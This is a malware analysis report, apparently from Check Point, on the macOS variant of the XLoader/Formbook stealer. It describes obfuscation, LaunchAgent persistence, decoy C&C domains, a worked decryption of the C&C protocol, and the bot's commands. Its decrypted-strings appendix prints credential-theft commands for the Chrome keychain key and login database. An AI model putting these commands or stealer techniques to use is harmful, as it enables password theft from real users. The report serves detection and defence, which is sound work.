It is even more dangerous when developers of malware for macOS\ndraw on their successful experience from similar development for Windows.\n\n[In one of our recent researches, we found that](https://research.checkpoint.com/2021/top-prevalent-malware-with-a-thousand-campaigns-migrates-to-macos/) [Formbook, one of the most prevalent data stealers, is](https://malpedia.caad.fkie.fraunhofer.de/details/win.formbook)\nnow sold in the underground forum under a new name, XLoader, and has new capabilities that enable it\nto operate in macOS.\n\n\n-----\n\n**Figure 1 – XLoader ads in the underground forum.**\n\nHowever, until June 2021, we did not come across a single macOS sample of this malware in the wild.\nWe monitor a large number of macOS samples on a daily basis. Recently, we caught in our sandbox a\n[suspicious macOS sample that had zero detects on VirusTotal:](https://www.virustotal.com/gui/file/97d6b194da410db82d9974aec984cff8ac0a6ad59ec72b79d4b2a4672b5aa8aa/detection)\n\n**Figure 2 – macOS malicious sample with zero detects on VirusTotal.**\n\nThe network traffic generated by this sample appeared to be very similar to something we saw\npreviously:\n\n**Figure 3 – Network traffic generated by XLoader for macOS.**\n\n\n-----\n\n[We checked in our malware database and easily found an XLoader sample for Windows with the same](https://www.virustotal.com/gui/file/67ec47ff93dd597ed6ffa48d8c111f80d827f2351423929b0d341a08f8ac4dcb/behavior/C2AE)\ncampaign id “09rb” that generates similar network traffic:\n\n**Figure 4 – Network traffic generated by XLoader for Windows.**\n\nIn this article, we present detailed analysis of the malicious macOS sample we found and its features.\nThe anti-analysis tricks, encryption, network communication, and the list of supported commands leave\nus in no doubt: we got our hands on an XLoader variant for macOS, which is really similar to Formbook\nmalware.\n\n## Anti-analysis techniques\n\nThe XLoader binary doesn’t have any imports except dlsym(). Function names are stored in two\nencrypted buffers. XLoader decrypts the names of the required functions and resolves their addresses\nusing the dlsym() function:\n\n**Figure 5 – macOS XLoader anti-analysis techniques.**\n\n[At the initialization stage, XLoader implements a simple ptrace-based anti-debugging technique:](https://stackoverflow.com/a/47755340/477168)\n\n**Figure 6 – macOS XLoader anti-debugging technique.**\n\n## Encrypted strings\n\nMost of the text strings used by the malware, such as HTTP headers and filenames, as well as the URL\nof its C&C server, are encrypted and stored inside the buffers of a special form (so called “encbufs”).\n[The encryption scheme is very similar to the one used in Formbook and XLoader for Windows, but the](https://www.netscout.com/blog/asert/formidable-formbook-form-grabber)\nmacOS version of XLoader has some distinguishing features.\n\n\n-----\n\nIn Formbook and both variants of XLoader, every encrypted buffer is prepended by a small function that\nis used to access the buffer. Some of the encrypted buffers contain data, while the other buffers contain\na key used for decrypting other buffers.\n\nThe buffers containing the encrypted data and the keys are designed to look like valid function assembly\ncode, with a prologue and the “retn” instruction at the end:\n\n**Figure 7 – Formbook and macOS XLoader encrypted buffers.**\n\nFirst, every buffer is passed to the decoding function, which removes the fake prologue, and extra bytes\nare added to make the data look like assembly code. XLoader for macOS is 64-bit executable; therefore,\nthe decoding function is implemented for x64 assembly, while the XLoader version for Windows uses\nx86 assembly.\n\nThe decoded buffer that contains the encrypted data is then passed to the modified RC4 function. In all\nvariants of Formbook and XLoader, this function is equivalent to the following C-code:\n```\nvoid mod_rc4_decrypt(BYTE *buff, unsigned int buff_len, BYTE *key)\n{\n  int i;\n  for (i = buff_len - 1; i > 0; i--)\n   buff[i - 1] -= buff[i];\n  for (i = 0; i < buff_len - 1; i++)\n   buff[i] -= buff[i + 1];\n  RC4(buff, buff_len, key, 20);\n  for (i = buffer_len - 1; i > 0; i--)\n   buff[i - 1] -= buff[i];\n  for (i = 0; i < buff_len - 1; i++)\n   buff[i] -= buff[i + 1];\n}\n\n```\nThe decryption flow for encrypted buffers is rather complicated and it’s easier to visualize in a diagram:\n\n\n-----\n\n**Figure 8 – Decryption of the data buffers in XLoader for macOS.**\n\nThe “layer2_keys” from the diagram above are calculated individually for each encrypted buffer using\nthe following algorithm:\n\n**Figure 9 – Deriving decryption keys for encrypted buffers.**\n\nIn the XLoader version for Windows, the encryption scheme remains the same as it was in Formbook,\nexcept for the number and the purpose of the encrypted buffers.\n\n## Persistence\n\nIn its initial run, the malware copies itself into the newly created, randomly named hidden folder in the\nuser’s home directory. The name of the application and of the executable binary is randomized as well.\nFor example:\n\n**/Users/user/.wznlVRt83Jsd/HPyT0b4Hwxh.app/Contents/MacOS/HPyT0b4Hwxh**\n\nThe malware creates an Info.plist file for the new application bundle using the template extracted from\none of the encrypted buffers. Then, in a separate thread, XLoader runs its copy from the new path.\n\n\n-----\n\nXLoader sets up an auto start by creating a new file with a random name in the LaunchAgents folder of\nthe current user:\n\n**/Users/user/Library/LaunchAgents/com.wznlVRt83Jsd.HPyT0b4Hwxh.plist**\n\nAfter the installation is complete, XLoader stops execution while it continues its malicious activity in the\nchild process.\n\n## Malware configuration\n\nXLoader has two buffers in which it stores addresses used to search its C&C server. One of the buffers\ncontains an address of a real C&C server in the following format:\n\n**www.iregentos[.]info/09rb/**\n\nAnother buffer contains a list of decoy domains. This means that the domains from this list don’t host a\nreal C&C panel and are only used to mask the real C&C communication.\n\n**Figure 10 – macOS XLoader decrypted buffer contain a list of 64 decoy domains and the C&C URI.**\n\nXLoader randomly chooses 16 of the 64 domain names and creates a list of URIs using the campaign id:\n\n**www.briannanbrown[.]com/09rb/ www.franciscobueno[.]guru/09rb/ …**\n\n\n-----\n\n**Figure 11 – XLoader randomly chooses 16 of 64 decoy domains.**\n\nIn the created list, a random URI is replaced with the main URI extracted from the first buffer:\n\n**Figure 12 – XLoader inserts the address of the C&C server into a random place in the list.**\n\nTherefore, every time the malware runs, the created list always contains the URI from the first buffer,\nwhile the other URIs can change.\n\nThis is different from the XLoader version for Windows in which the address of a real C&C server is\ncontained in the list of “decoys.” However, we should emphasize that the XLoader versions for macOS\nand the Windows for the campaign “09rb” share the same real C&C server “www.iregentos[.]info”.\n\n## C&C communication\n\nAt first glance, if we look at the encrypted XLoader communication, we don’t see any difference in\ncomparison to Formbook. For C&C communication, XLoader uses the HTTP protocol and sends data\nusing GET or POST requests, depending on the kind of data.\n\nXLoader sends beaconing requests in a loop while the malware is running. The requests look like this:\n\n**GET /vpz6/?**\n**Tl=tDdHvn8X6rT&qF7xr2rx=Rva7WvGfqee/ASq4k5lYe0dVNkfCuS3Tauh/YI8ic9vhGQpK/u62RmZZV0B**\n**HTTP/1.1 Host: www.bostonm[.info Connection: close**\n\nXLoader sends the data in one of the values of the query string in BASE64-encoded form. The keys in\nthe query string are randomly generated and don’t contain useful data.\n\nAs opposed to Formbook, which uses one layer of RC4 encryption, in XLoader the data is RC4encrypted in two layers. The key for the internal layer of encryption is calculated from the C2 URL using\nits own implementation of SHA1 with reversed DWORD endianness. The key for the second layer of\nencryption is calculated from one of the encrypted buffers extracted from the configuration\n(common_c2_key) using the modified RC4 cypher (see mod_rc4_decrypt above) and the previously\ncalculated SHA1 for the URI.\n\nTo decrypt an XLoader request, we can use this algorithm:\n\n1. Decode the value from the query string using BASE64:\n```\nencrypted_data =\nbase64.b64decode(\"Rva7WvGfqee/ASq4k5lYe0dVNkfCuS3TauhC/YI8ic9vhGQpK/u62RmZZV0B\")\n#46f6bb5af19fa9e7bf012ab89399587b47553647c2b92dd36ae842fd823c89cf6f8464292bfbbad91999655d01\n\n```\n2. Calculate the c2_layer1_key using modified SHA1:\n\n\n-----\n\n```\nh sha1(b www.bostonm.info/vpz6/ ).digest()\nc2_layer1_key = b\"\".join([struct.pack(\">I\", x) for x in struct.unpack(\"<IIIII\", h)]) #\nf36e72e54647ffa7187046d3e035d0bd9d10c3c2\n\n```\n3. Decode the common_c2_key extracted from one of the encrypted buffers:\n```\ncommon_c2_key = decode_encbuf(encbuf9) \n# 0cbe4d36992df082c2efc4ec41a9ed571cbf14e9\n\n```\n4. Decrypt the common_c2_key using mod_rc4_decrypt (see above) with the c2_layer1_key to get\n**c2_layer2_key:**\n```\nc2_layer2_key = mod_rc4_decrypt(common_c2_key, c2_layer1_key)\n# 00ad36f49703cee9023498d594df3b2e568ca3d2\n\n```\n5. Decrypt the external layer using RC4 with the c2_layer2_key:\n```\ninternal_layer = ARC4.new(c2_layer2_key).decrypt(encrypted_data)\n#901975c550a7d567ef93b4fdce0324aa9650561b567f4b73cb7da8549b83a84d1f181839155a4c86ee957cdf09\n\n```\n6. Decrypt the internal layer using RC4 with the c2_layer1_key:\n```\ndecrypted = ARC4.new(c2_layer1_key).decrypt(internal_layer)\n# 'XLNG:572E4DF71.1:OS X 10.14.0 Mojave:cm9vdA=='\n\n```\nIn XLoader for Windows, the common_c2_key value is additionally encrypted with another key stored in\nthe configuration. Therefore, decrypting the communication of XLoader for Windows is a little bit harder.\n\nAfter decrypting the data, we get the string which is sent in the beaconing message. The data format is\nsimilar to that in the Formbook malware:\n\n**XLNG:572E4DF71.1:OS X 10.14.0 Mojave:cm9vdA==**\n\nWhere:\n\n“XLNG” – Magic bytes for XLoader.\n“572E4DF7” – Bot unique id, calculated as the CRC32/Bzip2 checksum of the 32-byte buffer\ncontaining the current user name and the common_c2_key (this can be used for validating the\nbot, but likely used only for bot identification).\n“1.1” – The malware version.\n“OS X 10.14.0 Mojave” – OS version.\n“cm9vdA==” – The base64-encoded user name (“root” in this case).\n\nAll other data that is sent by the bot or by a C&C server is RC4-encrypted in 2 layers and base64encoded as well. Other than that, the C&C communication of the macOS XLoader malware is very\n[similar to the Formbook communication.](https://www.fireeye.com/blog/threat-research/2017/10/formbook-malware-distribution-campaigns.html)\n\nIf there are any commands for the bot, the C&C server replies with the data in the HTTP response body.\n\nThe decrypted response starts and ends with the “XLNG” magic string and has the following format:\n\n**XLNG4https://maliciouswebsite.comXLNG**\n\n\n-----\n\nWhere:\n\n“4” – Command code (“Visit URL” in this case).\n“https://maliciouswebsite.com” – Command payload.\n\n[XLoader supports the following commands that are very similar to Formbook commands:](https://www.fireeye.com/blog/threat-research/2017/10/formbook-malware-distribution-campaigns.html)\n\n**1** Download and execute file\n\n**2** Update bot\n\n**3** Uninstall bot\n\n**4** Visit URL\n\n**5** Clear cookies\n\n**6** Recover passwords (Firefox, Chrome)\n\n**7** Shutdown\n\n**8** Reboot\n\n**9** Download and unpack a zip archive with NSS3 library, recover Firefox passwords\n\nLet’s take a closer look at some of these commands and their implementation details.\n\n### Download and execute file\n\nThe content of the file to execute is sent in the message body (after “XLNG1“). Before the terminating\n“XLNG” magic sequence, the file extension is also provided. XLoader creates a file with a random name\nand the specified extension inside of the current user’s home directory. For example:\n\n**/Users/user/5JCLglq.sh**\n\nThe stored file is then executed using the system() function and the command line “open [filename]”.\n\n### Visit URL\n\nXLoader executes the shell command “open [URL]” when it receives this command.\n\n### Firefox password recovery\n\nTo get Firefox profiles, XLoader enumerates sub-folders in the “/Library/Application\n**Support/Firefox/Profiles” folder. For each subfolder, XLoader opens the file “/Library/Application**\n**Support/Firefox/Profiles/[prfile_name]/logins.json”. XLoader decrypts the data from the “logins.json”**\nfiles using the function “PK11SDR_Decrypt” from the “libnss3.dylib” library.\n\n### Chrome password recovery\n\nXLoader obtains saved Chrome passwords from the SQLite database located in “/Library/Application\n**[Support/Google/Chrome/Default/Login Data” using the same algorithm described here.](https://security.stackexchange.com/questions/186513/retreiving-google-chrome-passwords)**\n\n\n-----\n\nFirst, it retrieves encrypted passwords from the Chrome SQLite database using the following query:\n\n**SELECT origin_url, username_value, password_value FROM logins**\n\nThen it derives the decryption key:\n\n**Figure 13 – XLoader obtains the decryption key for the Chrome SQLite database.**\n\nFinally, it decrypts the passwords using openssl:\n\n**Figure 14 – XLoader decrypts Chrome passwords using openssl.**\n\n## Conclusion\n\nThe Formbook/XLoader malware has been a prominent threat for Windows users for more than five\nyears. Recently, this malware has begun to affect macOS users as well. With approximately 200 million\nmacOS users worldwide, this is definitely a promising new market for Xloader’s creators. We found\nmalicious samples for both Windows and macOS in the wild, with the same configuration and that\ncontact the same C&C servers. This allows attackers to control infected Windows and macOS machines\nfrom a single point.\n\nThe malware authors clearly drew upon their experience in Windows malware development, taking the\nexisting Formbook codebase as a core for a new XLoader macOS version. The malware’s use of antianalysis tricks, obfuscation techniques and communication encryption all significantly complicate\nmalware analysis and helped XLoader go unnoticed for a long time. We are constantly monitoring this\nevolving threat and provide Check Point customers with the relevant protections.\n\n## Appendix A: Indicators of Compromise\n\n\n-----\n\n**SHA256:**\n97d6b194da410db82d9974aec984cff8ac0a6ad59ec72b79d4b2a4672b5aa8aa\n46adfe4740a126455c1a022e835de74f7e3cf59246ca66aa4e878bf52e11645d\n\n**MD5:**\na17bf4533d7ec677a0d4bdae19e41ff2\n997af06dda7a3c6d1be2f8cac866c78c\n\n**C&C server:**\nwww.iregentos[.]info/09rb/\n\n## Appendix B: Decrypted Buffers\n\n**“buffer1_1480_strings”: [‘libobjc.A.dylib’, ‘libSystem.B.dylib’, ‘libsqlite3.0.dylib’, ‘libcrypto.dylib’,**\n‘libnss3.dylib’, ‘Cocoa’, ‘AppKit’, ‘CoreData’, ‘Foundation’, ‘CoreServices’, ‘CoreFoundation’,\n‘ApplicationServices’, ‘.framework/Versions/’, ‘/System/Library/Frameworks/’,\n‘/Library/LaunchAgents/com.’,\n‘ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/’, ‘kern.osrelease’,\n‘Puma’, ‘Jaguar’, ‘Panther’, ‘Tiger’, ‘Leopard’, ‘Snow Leopard’, ‘Lion’, ‘Mountain Lion’, ‘Mavericks’,\n‘Yosemite’, ‘El Capitan’, ‘Sierra’, ‘High Sierra’, ‘Mojave’, ‘Catalina’, ‘persistent’, ‘\\r\\nConnection:\nclose\\r\\n\\r\\n’, ‘POST ‘, ‘ HTTP/1.1\\r\\n’, ‘Host: ‘, ‘\\r\\nConnection: close\\r\\n’, ‘Content-Length: ‘,\n‘\\r\\nCache-Control: no-cache\\r\\n’, ‘Origin: https://’, ‘\\r\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac\nOS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko)’, ‘\\r\\nContent-Type: application/x-wwwform-urlencoded\\r\\n’, ‘Accept: */*\\r\\n’, ‘Referer: https://’, ‘\\r\\nAccept-Language: en-US’, ‘\\r\\nAcceptEncoding: gzip, deflate\\r\\n\\r\\ndat=’, ‘osascript -e \\’tell app “System Events” to shut down\\”, ‘osascript -e\n\\’tell app “System Events” to restart\\”, ‘/Library/Application Support/Google/Chrome/Default/Login\nData’, ‘/Library/Application Support/Firefox/Profiles’, ‘SELECT origin_url, username_value,\npassword_value FROM logins’, “security find-generic-password -wa ‘Chrome'”, “openssl enc -base64 d -aes-128-cbc -iv ‘20202020202020202020202020202020’ -K “,\n‘/Applications/Firefox.app/Contents/MacOS’, ‘DYLD_LIBRARY_PATH’, ‘Username: ‘, ‘Password: ‘,\n‘formSubmitURL’, ‘usernameField’, ‘encryptedUsername’, ‘encryptedPassword’, ‘\\\\logins.json’,\n‘\\\\signons.sqlite’]\n\n**“buffer2_874_funcnames”: [‘exit’, ‘open’, ‘read’, ‘write’, ‘dlsym’, ‘dlopen’, ‘geteuid’, ‘getpwuid’,**\n‘vm_region’, ‘vm_protect’, ‘vm_allocate’, ‘vm_deallocate’, ‘mach_task_self’, ‘shm_open’, ‘shm_unlink’,\n‘sysctlbyname’, ‘usleep’, ‘arc4random’, ‘stat’, ‘fstat’, ‘mkdir’, ‘remove’, ‘system’, ‘_close’, ‘chmod’,\n‘ptrace’, ‘pthread_create’, ‘gethostuuid’, ‘getenv’, ‘setenv’, ‘execv’, ‘kill’, ‘getpid’, ‘mmap’, ‘ftruncate’,\n‘proc_listpids’, ‘proc_pidinfo’, ‘popen’, ‘pclose’, ‘fscanf’, ‘opendir’, ‘readdir’, ‘closedir’, ‘_CFRelease’,\n‘_CFStringGetCStringPtr’, ‘_CFStringCreateWithCString’, ‘_CFUserNotificationDisplayAlert’,\n‘objc_getClass’, ‘objc_msgSend’, ‘sel_registerName’, ‘_AXUIElementCreateApplication’,\n‘_AXUIElementCopyAttributeValue’, ‘sqlite3_open’, ‘sqlite3_step’, ‘sqlite3_prepare_v2’,\n‘sqlite3_column_text’, ‘sqlite3_column_blob’, ‘sqlite3_column_bytes’,\n‘PKCS5_PBKDF2_HMAC_SHA1’, ‘NSS_Init’, ‘NSS_Shutdown’, ‘PK11_FreeSlot’,\n‘PK11SDR_Decrypt’, ‘PK11_Authenticate’, ‘PK11_GetInternalKeySlot’]\n\n**“buffer3_68_funcnames”: [‘htons’, ‘socket’, ‘setsockopt’, ‘getaddrinfo’, ‘send’, ‘recv’, ‘connect’,**\n‘close’]\n\n\n-----\n\n**“buffer4_1201_decoys”: [‘anabelenfunes.com’, ‘cmdp0o7mi0-e.info’, ‘briannanbrown.com’,**\n‘drlindaydevenish.com’, ‘my6method.com’, ‘franciscobueno.guru’, ‘326ec.com’, ‘dutythrow.com’,\n‘sdqz114.com’, ‘kikibeautyspace.com’, ‘fashionsbyfluff.com’, ‘nctichurch.com’,\n‘hiphopjewelrybling.com’, ‘pressuakickz.com’, ‘hansonwedding2020.com’, ‘ssmjoin.com’,\n‘thebinshaker.com’, ‘copytoronto.icu’, ‘newsshortage.com’, ‘noaccountbet-ci.com’, ‘vip72.club’, ‘jetecengineering.com’, ‘fjdjkrjkfjkde.com’, ‘rshuahui.com’, ‘pgmedicaloxygencentre.com’,\n‘primarycarewestpalmbeach.com’, ‘certificationbuilders.com’, ‘nikkisellsnv.com’, ‘vrcadearena.com’,\n‘intrastreamer.com’, ‘sbhardwoodlumber.com’, ‘corpsecorral.com’, ‘autoprestige24.com’,\n‘exploringelleblog.com’, ‘newrayfreight.com’, ‘natchbricks.com’, ‘weyeny.com’, ‘relexoo.space’,\n‘thedoubletwelve.com’, ‘clinclan.com’, ‘damndawgleads.com’, ‘adhyashaktiastro.com’,\n‘yavuzisitme.net’, ‘decoratudo.com’, ‘furnishyourhomes.com’, ‘askmohsin.com’, ‘forlgiss.net’,\n‘electricbrandsusa.com’, ‘twotiredbikeshop.com’, ‘shopmasstrim.com’, ‘siderplan.com’,\n‘originalwebcreations.com’, ‘parcel-rix.info’, ‘lidokeyhomes.info’, ‘theremedy-project.com’,\n‘ugt6bpz6ucg.net’, ‘unclejoemomala.com’, ‘aika-prod.com’, ‘platinumbullion.net’, ‘idahosothebys.com’,\n‘wellnessmywaynow.com’, ‘hypesoleco.com’, ‘lionzmf.info’, ‘zincfacemask.com’]\n\n**“buffer5_34_c2_url”: [‘www.iregentos[.]info/09rb/’, ‘/09rb/’]**\n\n\n-----",
